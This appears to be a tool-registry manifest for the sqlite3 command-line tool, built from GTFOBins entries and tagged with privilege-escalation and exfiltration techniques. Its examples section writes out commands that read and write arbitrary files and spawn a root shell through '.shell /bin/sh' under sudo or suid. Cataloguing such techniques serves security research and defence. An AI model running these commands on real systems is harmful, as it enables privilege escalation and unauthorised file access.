---
id: database-sqlite-sqlite3
namespace: database:sqlite:sqlite3
name: sqlite3
description: SQLite3 database command-line interface; can execute queries, read/write
  files, and spawn shells.
author: GTFOBins
version: 1.0.0
capabilities:
- system.file.read
- system.file.write
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- sqlite3
parameters: []
features:
- file-system
- interactive
- local
- pipes-stdin
- process-manip
- requires-root
execution:
  template: sqlite3
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Read arbitrary files (sudo, suid, unprivileged)
  command: 'sqlite3 <<EOF

    CREATE TABLE x(x TEXT);

    .import /path/to/input-file x

    SELECT * FROM x;

    EOF'
- description: Write to arbitrary files (sudo, suid, unprivileged)
  command: sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
- description: Spawn an interactive shell (sudo, suid, unprivileged)
  command: sqlite3 /dev/null '.shell /bin/sh'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/sqlite3/
techniques:
- collection
- exfiltration
- privilege-escalation
- execution
install:
- method: apt
  package_name: sqlite3
  commands:
  - apt-get install -y sqlite3
---

# sqlite3

sqlite3 is a command-line utility. SQLite3 database CLI; can execute arbitrary queries and read files.
